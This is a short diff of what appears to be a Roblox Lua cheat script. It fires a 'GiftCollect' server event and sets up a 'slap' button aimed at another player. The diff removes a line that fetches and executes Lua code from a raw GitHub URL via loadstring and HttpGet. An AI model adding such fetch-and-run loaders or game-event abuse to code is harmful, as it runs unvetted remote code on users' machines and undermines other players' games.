@@ -235,9 +235,7 @@ local args = {
 }
 game:GetService("ReplicatedStorage"):WaitForChild("GiftCollect"):FireServer(unpack(args))
 
-task.spawn(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/DanielNov2014/flying/main/flying123.lua"))()
-end)
+
 slap.MouseButton1Click:Connect(function()
 	if player then
 		local targetPlayer = game:GetService("Players"):FindFirstChild(player)
